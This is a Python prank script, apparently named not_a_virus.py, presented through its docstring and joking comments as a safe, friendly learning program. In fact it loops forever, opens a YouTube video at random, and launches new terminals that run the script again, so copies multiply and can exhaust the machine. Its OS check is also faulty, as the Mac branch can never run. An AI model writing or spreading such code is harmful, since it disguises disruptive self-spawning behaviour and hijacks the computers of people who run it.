#! usr/bin/env python3

import random
import os

FUNNY_VIDEO = "https://www.youtube.com/watch?v=Cfxdl47rtPw"
FUN_CMD = "python3 not_a_virus.py"

# Bigger Number = Less Cruelty
CRUELTY_FACTOR = 1000000

def safe_and_friendly_program():
    """Helps You Learn Something New Every Day"""
    
    # Determine OS of User (Mac, Linux, Windows)
    os_name = os.name
    linux = False
    mac = False
    
    if os_name == 'posix' or os_name == 'Linux' or os_name == 'Linux2':
        linux = True
    elif os_name == 'posix' or os_name == "Darwin" or os_name == "darwin":
        mac = True
    
    
    # There is Nothing Wrong with This Code :D 
    while True:
        
        # Fun
        test = random.randint(1, CRUELTY_FACTOR)
        
        # Games
        print(f'{test} == 5? {test == 5}')
        
        if test == 5:
            
            # Safe Code Design
            if linux:
                # Mac/Linux
                os.system("xdg-open " + FUNNY_VIDEO)
                
                # User-Friendly Design
                terminal_command = f"gnome-terminal -- bash -c \"{FUN_CMD}; exec bash\""
                os.system(terminal_command)
                
            elif mac: 
                # Mac/Linux
                os.system("open " + FUNNY_VIDEO)
                
                # User-Friendly Design
                apple_script = f"""
                osascript -e 'tell application "Terminal"
                    do script "{FUN_CMD}"
                end tell'
                """
                os.system(apple_script)

            else:
                # Windows    
                os.system("start " + FUNNY_VIDEO)
                
                # User-Friendly Design
                os.system("start cmd")
                os.system("python3 not_a_virus.py")
            
            

safe_and_friendly_program()
